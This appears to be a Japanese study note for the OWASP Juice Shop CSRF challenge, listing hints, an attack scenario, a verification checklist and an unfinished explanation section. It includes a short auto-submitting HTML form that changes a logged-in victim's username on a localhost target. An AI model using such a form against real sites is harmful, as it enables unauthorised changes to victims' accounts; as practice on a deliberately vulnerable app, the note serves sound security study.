# CSRF ❌

**難易度:** ⭐⭐⭐
**カテゴリ:** CSRF
**目標:** 別オリジンからユーザー名を変更する

## ヒント

- **ターゲット:** `/profile` エンドポイント (POST)
- **必要条件:** SameSite Cookie が無効なブラウザ
  - Firefox 96.x 以前
  - Chrome: `--disable-features=SameSiteByDefaultCookies` オプション
- **脆弱性:** CSRFトークンが実装されていない

## 攻撃シナリオ

1. 被害者が Juice Shop にログイン済み
2. 被害者が攻撃者のページを訪問
3. 自動的にフォームが送信され、ユーザー名が変更される

## 攻撃コード

```html
<!-- 攻撃者のサイト (例: http://htmledit.squarefree.com) -->
<form action="http://localhost:3000/profile" method="POST">
  <input name="username" value="CSRF_HACKED"/>
  <input type="submit"/>
</form>
<script>document.forms[0].submit();</script>
```

## 検証ポイント

- [ ] 被害者がログイン済みか確認
- [ ] SameSite Cookie が無効か確認
- [ ] プロフィールページでユーザー名が変更されたか確認

## 解説

[未着手]
